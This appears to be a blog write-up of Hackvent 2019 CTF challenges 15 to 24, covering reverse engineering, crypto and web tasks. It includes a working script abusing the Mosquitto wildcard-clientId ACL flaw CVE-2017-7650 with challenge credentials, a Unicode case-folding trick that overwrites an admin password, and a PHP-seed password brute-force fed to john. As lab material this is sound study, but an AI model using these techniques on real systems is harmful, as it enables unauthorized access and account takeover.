description. Looking at the day’s flag and the challenge’s author, it
becomes apparent that the flag is yet another valid Perl script (like
basically any gibberish that can be expressed with ASCII characters 😛
). Saving the flag to a file and running it through the Perl parse
yields the text: `Squ4ring the Circle`

## HV19.15 Santa’s Workshop

> The Elves are working very hard.
>
> Look
> at [http://whale.hacking-lab.com:2080/](http://whale.hacking-lab.com:2080/) to
> see how busy they are.

Looking at the page, we can see an counter of processed gifts. Looking
at the network tab inside Chrome’s developer tools, one can see that a
websocket connection was established that basically wraps MQTT traffic:

[![](./hv19.15_webservice.png)](./hv19.15_webservice.png)

Directly connecting to the MQTT broker and subscribing to the
`$SYS/broker/version` topic, yields the following message:

``` brush:
mosquitto version 1.4.11 (We elves are super-smart and know about CVE-2017-7650 and the POC. So we made a genious fix you never will be able to pass. Hohoho)
```

The broker is running o Mosquitto 1.4.11 which contains a
[vulnerability](https://bugs.eclipse.org/bugs/show_bug.cgi?id=516765)
inside the ACL code that is responsible for applying dynamic access
control lists: If a clientId contains a hash or plus symbol, the client
will be authorized to subscribe to all topics that match the wildcard
pattern.

After some trial&error, it was found that a similar pattern-based ACL
was used as in the original bug report. Using “#” or “+” as clientId
failed, since the ID apparently had to be “somewhat numeric”. Using the
following Python script, the flag could finally be retrieved (using a
clientId of `0155032044094537/+`):

``` brush:
import paho.mqtt.client as mqtt

host = 'whale.hacking-lab.com'
port = 9001
username = 'workshop'
password = '2fXc7AWINBXyruvKLiX'
clientid = '0155032044094537'
clientid = '0155032044094537/+'
topic = 'HV19/gifts/' + clientid;
#topic = 'HV19/gifts/'+clientid+'/flag-tbd';

def on_connect(mqttc, obj, flags, rc):
  print('connected: '+str(rc))
  mqttc.subscribe('#')
  mqttc.subscribe('$SYS/#')

def on_message(mqttc, obj, msg):
  print(msg.topic+' '+str(msg.qos)+' '+str(msg.payload))

def on_subscribe(mqttc, obj, mid, granted_qos):
  print('Subscribed: '+str(mid)+' '+str(granted_qos))

def on_log(mqttc, obj, level, string):
  print(string)

def on_publish(mqttc, obj, mid):
  print('mid: '+str(mid))

mqttc = mqtt.Client(client_id = clientid, clean_session=True, transport="websockets")
mqttc.username_pw_set(username, password)
mqttc.on_message = on_message
mqttc.on_connect = on_connect
mqttc.on_publish = on_publish
mqttc.on_subscribe = on_subscribe
mqttc.on_log = on_log
mqttc.connect(host, port, 60)
mqttc.loop_forever()
```

[![](./hv19.15_mqtt-1024x344.png)](./hv19.15_mqtt.png)

## HV19.16 B0rked Calculator

> Santa has coded a simple project for you, but sadly he removed all the
> operations.
>
> But when you restore them it will print the flag!

After poking around the code in IDA Freeware, the following
“interesting” snipped could found:

[![](./hv19.16_ida1-1024x479.png)](./hv19.16_ida1.png)

Basically, this part of the code decides which operation should be
performed (originally, the target functions where unnamed). Following
one of these functions reveals why the calculator only returns gibberish
(and wrong results):

[![](./hv19.16_ida2.png)](./hv19.16_ida2.png)

The function code for all mathematical operations has been (partially)
NOP’d out. After each function’s purpose had been identified, they could
easily be fixed with the help of x64dbg, patching the missing
instructions and saving the patched PE file:

[![](./hv19.16_x64dbg.png)](./hv19.16_x64dbg.png)

Running the patched binary reveals the flag for dy 16:

[![](./hv19.16_flag.png)](./hv19.16_flag.png)

Alternatively, the flag could be calculated from the following function
(after detecting each function’s purpose):

[![](./HV19.16_ghidra.png)](./HV19.16_ghidra.png)

## HV19.17 Unicode Portal

> Buy your special gifts online, but for the ultimative gift you have to
> become admin.

Registering to the website with a new user and logging in, reveals the
following page:

[![](./hv19.17_homepage-1024x944.png)](./hv19.17_homepage.png)

The website allows viewing (parts of) the underlying code:

``` brush:
<?php

if (isset($_GET['show'])) highlight_file(__FILE__);

/**
 * Verifies user credentials.
 */
function verifyCreds($conn, $username, $password) {
  $usr = $conn->real_escape_string($username);
  $res = $conn->query("SELECT password FROM users WHERE username='".$usr."'");
  $row = $res->fetch_assoc();
  if ($row) {
    if (password_verify($password, $row['password'])) return true;
    else addFailedLoginAttempt($conn, $_SERVER['REMOTE_ADDR']);
  }
  return false;
}

/**
 * Determines if the given user is admin.
 */
function isAdmin($username) {
  return ($username === 'santa');
}

/**
 * Determines if the given username is already taken.
 */
function isUsernameAvailable($conn, $username) {
  $usr = $conn->real_escape_string($username);
  $res = $conn->query("SELECT COUNT(*) AS cnt FROM users WHERE LOWER(username) = BINARY LOWER('".$usr."')");
  $row = $res->fetch_assoc();
  return (int)$row['cnt'] === 0;
}

/**
 * Registers a new user.
 */
function registerUser($conn, $username, $password) {
  $usr = $conn->real_escape_string($username);
  $pwd = password_hash($password, PASSWORD_DEFAULT);
  $conn->query("INSERT INTO users (username, password) VALUES (UPPER('".$usr."'),'".$pwd."') ON DUPLICATE KEY UPDATE password='".$pwd."'");
}

/**
 * Adds a failed login attempt for the given ip address. An ip address gets blacklisted for 15 minutes if there are more than 3 failed login attempts.
 */
function addFailedLoginAttempt($conn, $ip) {
  $ip = $conn->real_escape_string($ip);
  $conn->query("INSERT INTO fails (ip) VALUES ('".$ip."')");
}

?>
```

Looking at the code and the purposely placed
`INSERT INTO ... ON DUPLICATE KEY UPDATE password=` part, it becomes
apparent that one has to register as user “santa”, overwriting the
user’s password. At BlackHat USA 2019, there was a presentation about
web attacks based on Unicode character confusion.

Taking a closer look at how usernames are verified upon registration
(converted to lowercase) and when added to the database (converted to
uppercase), it becomes apparent that a unicode character has to be found
that, when converted to uppercase, translates to a “regular” uppercase
letter.

Registering the username ` ſ anta` (with a lowercase long s) results in
the user SANTA’s password to be overwritten and allowing to login with
said user, yielding the flag for day 17:

[![](./hv19.17_flag.png)](./hv19.17_flag.png)

## HV19.18 Dance with me

> Santa had some fun and created todays present with a special dance.
> this is what he made up for you:
>
> `096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15`
>
> Dance with him to recover the flag.

Knowing hardlock for a bit, now, and after [surviving 11/12 Flare-on
Challenges](../index.html@p=479.html), the key to solving crypto-related
challenges is finding out which algorithm is used. A first step to that
challenge is using finding constants that are typical for an algorithm.
The value 0x61707865 inside the \_dance_block function reveals, that the
[Salsa-20 cipher](https://en.wikipedia.org/wiki/Salsa20) is used.

Looking at Ghidra’s decompiler output for the main function reveals all
required information for decrypting the flag:

``` brush:
undefined4 _main(void)

{
  size_t input_len;
  size_t sVar1;
  uint uVar2;
  char input [32];
  byte *buffer;
  undefined8 local_60;
  undefined8 uStack88;
  undefined8 local_50;
  undefined8 uStack72;
  undefined8 local_40;
  undefined8 uStack56;
  undefined8 local_30;
  undefined8 uStack40;
  int local_1c;
  
  local_1c = *(int *)___stack_chk_guard;
  local_40 = 0x6b400cecf40f7379;
  uStack56 = 0xa80004e71fc991fd;
  local_60 = 0xaf3cb66146632003;
  uStack88 = 0x9bb500ea7ec276aa;
  local_50 = 0x4cd04f2197702ffb;
  uStack72 = 0x46eeef0429ac57b2;
  local_30 = 0xf15e6a45636cf1ad;
  uStack40 = 0xb5a0a29d46799ded;
  _buffer = 0;
  _printf("Input your flag: ");
  _fgets(input,0x20,*(FILE **)___stdinp);
  input_len = _strlen(input);
  if (input_len == 0) {
    input_len = 0;
  }
  else {
    _memcpy(&buffer,input,input_len);
  }
  _dance((byte *)&buffer,input_len,0,(undefined4 *)&local_60,0xe78f4511,0xb132d0a8);
  sVar1 = _strlen(input);
  if (sVar1 != 0) {
    uVar2 = 0;
    do {
      _printf("%02X",(uint)*(byte *)((int)&buffer + uVar2));
      uVar2 = uVar2 + 1;
      sVar1 = _strlen(input);
    } while (uVar2 < sVar1);
  }
  _putchar(10);
  if (*(int *)___stack_chk_guard != local_1c) {
                    /* WARNING: Subroutine does not return */
    ___stack_chk_fail();
  }
  return 0;
}
```

At certain points, Ghidra made false assumptions about the parameters
being provided to the encrypt function, but this can be easily overcome
by taking a closer look at the disassembly. Finally, the following
Python script can be used to decrypt the flag for day 18:

``` brush:
from Crypto.Cipher import Salsa20

key = b'\x03\x20\x63\x46\x61\xb6\x3c\xaf\xaa\x76\xc2\x7e\xea\x00\xb5\x9b\xfb\x2f\x70\x97\x21\x4f\xd0\x4c\xb2\x57\xac\x29\x04\xef\xee\x46' # 0x7fa8
nonce = b'\xb1\x32\xd0\xa8\xe7\x8f\x45\x11'[::-1]
cipher = b'\x09\x6C\xD4\x46\xEB\xC8\xE0\x4D\x2F\xDE\x29\x9B\xE4\x4F\x32\x28\x63\xF7\xA3\x7C\x18\x76\x35\x54\xEE\xE4\xC9\x9C\x3F\xAD\x15'

plain = Salsa20.new(key=key, nonce=nonce).decrypt(cipher)
print(plain) # HV19{Danc1ng_Salsa_in_ass3mbly}
```

## HV19.19 ?

> ???????????????⛺❗️??????️?????????????????⁉️????????????????????⛪???????????❤️????????????????????????????????????????????⛴???????????????????⛄??⏳?????????????????????????????????????????????????????????????????????????????✨???????????⛲??????????⛵??????????????????
> ❗️➡️ ㉓ ??????❗️➡️ ??㊷ ? ⌘ ?⏩⏩ ???❗️ ?㉓❗️❗️ ? ⌘ ➡️? ㊷ ? ㉓ ⌘❗️❗️?
> ?????????????❤️??❤️???????⛪???? ❗️➡️ ? ??????????? ❗️➡️ ? ? ? ? ➡️
> ??⁉️ ➡️ ?? ?❗️?? ? ? ??❗️???❗️????❗️❗️❗️ ➡️ ? ↪️??❗️? ???❗️???????❗️?
> ☣️??????❗️❗️➡️ ✓? ⌘ ?⏩⏩???❗️??❗️❗️?? ㊷ ? ? ⌘❗️❗️ ➡️ ⌃? ? ⌘
> ???❗️❗️➡️ ^??⌃➖?㉓❗️➗?????❗️❗️❌^❌?⌘❗️➡️ ⎈ ↪️ ⌘ ◀ ??❗️?❎?? ㊷ ? ?
> ⌘❗️❗️➖ ?? ??❗️➕??❗️➖??❗️➖??❗️➕????❗️?✖??????❗️? ? ?⎈❗️❗️?
> ??????❗️?✍✓ ⎈ ⌘ ????❗️❗️?????✓ ??❗️❗️❗️➡️ ⌘↪️⌘ ? ?‍♀️???????❗️???⌘❗️? ?

The provided emoji text is actually source code for an
[Emojicode](https://www.emojicode.org/) program. The compiler allows
emitting LLVM code which is slightly easier to digest in a decompiler
like Ghidra, but still almost unreadable.

Running the code on try-it-online shows the following output:

? ➡️ ??⁉️ ➡️ ??  
? Program panicked: ?

After a lot trila&error, poking around with the binary in GDB, it
becomes apparent that it expects a single character input. After a lot
more guessing and thinking about the input prompt, the correct (emoji)
input was guessed, resulting in the flag being printed out:

[![](./tio_run-1024x858.png)](./tio_run.png)

## HV19.20 i want to play a game

> Santa was spying you on Discord and saw that you want something weird
> and obscure to reverse?
>
> your wish is my command.

The provided binary is a PlayStation4 game that (after some runtime
initialization) checks the MD5 hash of the `/mnt/usb0/PS4UPDATE.PUP`
file against a static value: `f86d4f9d2c049547bd61f942151ffb55`

If the hash matches the desired value, it reads 26 byte chunks (with an
offset of 0x1337 bytes between each chunk) and XOR’s them with a
hard-coded secret. Using the following Python script, the flag can be
restored:

``` brush:
#!/usr/bin/env python

secret = bytearray(b'\xce\x55\x95\x4e\x38\xc5\x89\xa5\x1b\x6f\x5e\x25\xd2\x1d\x2a\x2b\x5e\x7b\x39\x14\x8e\xd0\xf0\xf8\xf8\xa5')

with open('PS4UPDATE.PUP', 'rb') as f:
  for offset in range(0x1337, 0x1714908, 0x1337):
    f.seek(offset, 0)
    buffer = f.read(26)
    for i in range(26):
      secret[i] = secret[i] ^ buffer[i]
      
print(secret) # HV19{C0nsole_H0mebr3w_FTW}
```

On an (somewhat) unrelated note: This challenge showed, once again, that
it is always good to have more than one tool at hand. Combining the
results from [retdec](https://retdec.com/) decompiler, retdec
disassembler, [Hopper](https://www.hopperapp.com/),
[Ghidra](https://ghidra-sre.org/), and
[BinaryNinja](https://binary.ninja/) were necessary to recover the
binary’s (assumed) code. Neither of the tools alone did yield a
sufficiently clear picture about the binary’s inner functions

## HV19.21 Happy Christmas 256

> Santa has improved since the last Cryptmas and now he uses harder
> algorithms to secure the flag.
>
> This is his public key:
>
> `X: 0xc58966d17da18c7f019c881e187c608fcb5010ef36fba4a199e7b382a088072f`  
> `Y: 0xd91b949eaf992c464d3e0d09c45b173b121d53097a9d47c25220c0b4beb943c`
>
> To make sure this is safe, he used the NIST P-256 standard.
>
> But we are lucky and an Elve is our friend. We were able to gather
> some details from our whistleblower:
>
> – Santa used a password and SHA256 for the private key (d)  
> – His password was leaked 10 years ago  
> – The password is length is the square root of 256  
> – The flag is encrypted with AES256  
> – The key for AES is derived with `pbkdf2_hmac`, salt:
> “TwoHundredFiftySix”, iterations: `256 * 256 * 256`
>
> Phew – Santa seems to know his business – or can you still recover
> this flag?
>
> `Hy97Xwv97vpwGn21finVvZj5pK/BvBjscf6vffm1po0=`

From the above information, the following can be derived about Santa’s
password:

1.  The password can be found inside the rockyou password list
2.  It is 16 characters long
3.  The SHA256 hash value of the password is the private key d of the
    private NIST-P256 elliptic curve key

Thus, the first step would be to brute-force the password via simple
simple elliptic curve maths: Multiplying the generator point of
NIST-P256 must result in the public key point on said curve.

Once the password has been found, it can be fed into the PBKDF2_hmac
algorithm with the above mentioned parameters to yield the AES key and
finally decrypt the flag:

``` brush:
from fastecdsa.curve import P256
from fastecdsa.point import Point
from hashlib import sha256, pbkdf2_hmac
from Crypto.Cipher import AES
from base64 import b64decode

X = 0xc58966d17da18c7f019c881e187c608fcb5010ef36fba4a199e7b382a088072f
Y = 0xd91b949eaf992c464d3e0d09c45b173b121d53097a9d47c25220c0b4beb943c
cipher = b64decode('Hy97Xwv97vpwGn21finVvZj5pK/BvBjscf6vffm1po0=')

S = Point(X, Y, curve=P256)

for pw in open('rockyou.txt', 'rb'):
  pw = pw.strip()
  if not len(pw) == 16:
    continue
  d = int(sha256(pw).hexdigest(), 16)
  if S == P256.G*d:
    print('Found password: %s' % pw)
    print('d = 0x%x' % d)

    key = pbkdf2_hmac('sha256', pw, b'TwoHundredFiftySix', 256*256*256)
    result = AES.new(key, AES.MODE_ECB).decrypt(cipher)
    if b'HV19' in result:
      print(result) # HV19{sry_n0_crypt0mat_th1s_year}
      break
```

## HV19.22 The command … is lost

> Santa bought this gadget when it was released in 2010. He did his own
> DYI project to control his sledge by serial communication over IR.
> Unfortunately Santa lost the source code for it and doesn’t remember
> the command needed to send to the sledge. The only thing left is this
> file: [thecommand7.data](https://academy.hacking-lab.com/api/media/challenge/data/a97ef12f-c583-4c54-84e4-68eaa2737bd9.data)
>
> Santa likes to start a new DYI project with more commands in January,
> but first he needs to know the old command. So, now it’s on you to
> help out Santa.

Provided was a hex file for an ATmega328P core (at least that’s where
BinaryNinja and Atmel Studio gave the most sane output). Using objcopy,
the file an be converted to an actual binary for further static and
dynamic analysis:

``` brush:
$ objcopy --input-target=ihex --output-target=binary f.hex f.bin
```

Using retdec and Ghidra, it was attempted to recover pseudocode for
better understanding the firmware’s functionality:

``` brush:
#define WRITE_TO_IO(x,y) __asm(in (x), (y))
#define MEM_Z ((uint16_t*)((r31 << 8) | r30))
#define MEM_X ((uint16_t*)((r27 << 8) | r26))
#define DISABLE_INTERRUPTS __asm(cli)

uint8_t entry0 () {
    r1 = 0;
    WRITE_TO_IO (EECR, r1);
    r28 = 0xff;
    r29 = 0x08;
    WRITE_TO_IO (GPIO_0, r29);
    WRITE_TO_IO (EIMSK, r28);
    r17 = 0x01;
    r26 = 0;
    r27 = 0x01;
    r30 = 0x9e;
    r31 = 0x08;
    while ((r26 | (r27 << 8)) != (0x58 | (r17 << 8))) {
        r0 = *(MEM_Z);
        uint8_t local_0 = r30;
        r30++;
        r31 = (r30 < local_0) ? (r31 + 1) : r31;
        *(MEM_X) = r0;
        uint8_t local_1 = r26;
        r26++;
        r27 = (r26 < local_1) ? (r27 + 1) : r27;
    }
    r18 = 0x01;
    r26 = 0x58;
    r27 = 0x01;
    while ((r26 | (r27 << 8)) != (0xfe | (r18 << 8))) {
        *(MEM_X) = r1;
        uint8_t local_2 = r26;
        r26++;
        r27 = (r26 < local_2) ? (r27 + 1) : r27;
    }
    r17 = 0;
    r28 = 0x35;
    r29 = 0;
    while ((r28 | (r29 << 8)) != (0x34 | (r17 << 8))) {
        r28--;
        r29--;
        r30 = r28;
        r31 = r29;
        fcn_0000088e ();
    }
    fcn_000007a6 ();
    DISABLE_INTERRUPTS;
}
```

From the code above, one can see that the firmware first copies some
data from offset 0x89e to the memory location 0x100 inside the first
`while` loop. At that location, the string `139HSV_acdghlmnrtxy{}`,
followed by 43 whitespace characters can be found:

[![](./hv19.22_atmel_studio-1024x768.png)](./hv19.22_atmel_studio.png)

Stepping through the assembly in Atmel Studio, one can see how those
values are copied. In an attempt to speed up the analysis, loops can be
skipped by right-clicking the next instruction after the according
`BRNE` instruction and selecting “Run to cursor”. After a certain point,
the execution never stopped. Forcefully interrupting the execution by
pressing CTRL+F5 yielded the flag inside the memory view:

[![](./hv19.22_flag-1024x772.png)](./hv19.22_flag.png)

## HV19.23 Internet Data Archive

> Today’s flag is available in the Internet Data Archive (IDA).

Navigating to the provided link, one can see a form asking for username
and files to be downloaded. It was not allowed to download the flag
(even when modifying the checkbox’s attributes):

[![](./hv19.23_startpage-1024x713.png)](./hv19.23_startpage.png)

Submitting the form presents another page with a download link and the
according .zip password:

[![](./hv19.23_archive.png)](./hv19.23_archive.png)

The generated download files reside inside the /tmp folder which also
allows listing the directory’s content. Sorting the contents by “Last
modified” date, a `phpinfo.php` and `Santa-data.zip` from October 2019:

[![](./hv19.23_listing.png)](./hv19.23_listing.png)

Santa’s archive is encrypted, too, but with an unknown password. From
the website’s name and password scheme, it becomes apparent that the
passwords are related to the way archive passwords for the IDA Pro
installer had previously been generated. The algorithm had been [leaked
in June
2019](https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/).

Since the website is using PHP, and there are always some minor
differences in the respective `rand()` implementation, the following PHP
script(based on the Perl script from the before-mentioned blog post) was
created in order to brute-force the password:

``` brush:
<?php
$chars = "abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789";

for ($seed=0; $seed < 1577060820000; $seed++)
{
    srand($seed);
    $pw="";

    for($i=0;$i<12;++$i)
    {
            $key = rand(0, 53);
            $pw = $pw . $chars[$key];
    }
    echo "$pw\n";
}

?>
```

Using zip2john, a hash of Santa’s zip archive was extracted. The above
script’s output was then piped into john, revealing the password in a
mere 2 minutes:

``` brush:
$ php -f hv19.23.php | john --stdin hv19.23.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status

Kwmq3Sqmc5sA     (Santa-data.zip)
1g 0:00:02:03  0.008108g/s 35140p/s 35140c/s 35140C/s suKcApykm6ST..ApwYqaWtC2Zh
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Supplying the retrieved password (which resulted from the seed value
0x421337) the archive could be extracted and the 23rd flag was
retrieved: `HV19{Cr4ckin_Passw0rdz_like_IDA_Pr0}`

## HV19.24 ham radio

> Elves built for santa a special radio to help him coordinating today’s
> presents delivery.

Using `strings` on the provided Broadcom 43430 SDIO firmware, one can
easily find the firmware’s version string:

[![](./hv19.24_strings-1024x63.png)](./hv19.24_strings.png)

The original file can be found on the [Nexmon Github
repo](https://github.com/seemoo-lab/nexmon/tree/master/firmwares/bcm43430a1/7_45_41_46).
Using binwalk, a binary diff of the two files can be generated. At
first, only a few memory addresses were modified:

[![](./hv19.24_diff0-1024x403.png)](./hv19.24_diff0.png)

Further down, a lot code had been modified and a larger block of code
had been added to the end of the file:

[![](./hv19.24_diff1-1024x674.png)](./hv19.24_diff1.png)

From the above screenshot, one can notice a base64-encoded string that
was added to the binary:
`Um9zZXMgYXJlIHJlZCwgVmlvbGV0cyBhcmUgYmx1ZSwgRHJTY2hvdHRreSBsb3ZlcyBob29raW5nIGlvY3Rscywgd2h5IHNob3VsZG4ndCB5b3U/`
which decodes to: *Roses are red, Violets are blue, DrSchottky loves
hooking ioctls, why shouldn’t you?*

Tracing where that string is used with the help of Ghidra, one can see
that it is referenced from the first function inside the added code
block:

[![](./hv19.24_ghidra0-1024x554.png)](./hv19.24_ghidra0.png)

Using Ghidra, retdec and BinaryNinja, the function’s main functionality
could be reconstructed as follows:

``` brush:
char* DAT_00058ec4 = "Um9zZXMgYXJlIHJlZCwgVmlvbGV0cyBhcmUgYmx1ZSwgRHJTY2hvdHRreSBsb3ZlcyBob29raW5nIGlvY3Rscywgd2h5IHNob3VsZG4ndCB5b3U/";
char* DAT_00058eac = "\x29\x6a\x91\x44\x3b\xbe\x27\x15\x92\x07\xc9\xf3\x47\x77\xed\xe5\x26\x10\x76\x74\x80\x57\x1f";
char *DAT_00800000 = "\x41\xEA\x00\x03\x13\x43\x9B\x07\x30\xB5\x10\xD1\x0C\x68\x03\x68\x63\x40\x13\x60\x4C\x68\x43";

int FUN_00058dd8(undefined4 param_1, undefined *param_2, undefined4 param_3, undefined4 param_4, undefined4 param_5)
{
    FUN_00058d9c(param_3, param_4);
    char* local_38 = "\x09\xBC\x31\x3A\x68\x1A\xAB\x72\x47\x86\x7E\xE6\x4A\x1D\x6F\x04\x2E\x74\x50\x0D\x78\x06\x3E";
    
    switch(param_2)
    {
        case 0xcafe:
            strncpy(param_3, &DAT_00058ec4, param_4);
            return 0;
            
        case 0xd00d:
            FUN_00002390(&DAT_00058eac, &DAT_00800000, 0x17);
            return 0;
            
        case 0x1337:
            for (int i=0; i<24; i++)
                DAT_00058eac[i] ^= local_38[i];
            
            strncpy(param_3, &DAT_00058eac, param_4);
            return 0;
        
        default:
            return FUN_0081a2d4(param_1, param_2, param_3, param_4, param_5);
    }
}
```

Together with the poem from above, on can derive that this function is
used for hooking ioctl calls. The memory location starting at
`0x00800000` represents the Broadcom chip’s internal ROM. The
`FUN_00002390` is responsibel for copying 23 bytes from the ROM to the
RAM location that is later on referenced inside the `0x1337` switch
case.

Lacking a RaspberryPi 3, the chip’s internal ROM can be found inside
[another repository of the Nexmon
makers](https://github.com/seemoo-lab/bcm_misc/tree/master/bcm43430a1).
After some pondering around inside a Python console, the desired order
can be found: Send ioctl 0xd00d to copy the ROM to the RAM, afterwards
ioctl 0x1337 has to be issued for XOR’ing the first 23 ROM bytes with a
locally defined byte-pattern:

``` brush:
$ python
Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 21:26:53) [MSC v.1916 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> def xor(s1, s2):
...   result = bytearray()
...   for a,b in zip(s1, s2):
...     result.append(a^b)
...   return result
...
>>> print(xor(b'\x41\xEA\x00\x03\x13\x43\x9B\x07\x30\xB5\x10\xD1\x0C\x68\x03\x68\x63\x40\x13\x60\x4C\x68\x43', b'\x09\xBC\x31\x3A\x68\x1A\xAB\x72\x47\x86\x7E\xE6\x4A\x1D\x6F\x04\x2E\x74\x50\x0D\x78\x06\x3E'))
bytearray(b'HV19{Y0uw3n7FullM4Cm4n}')
```
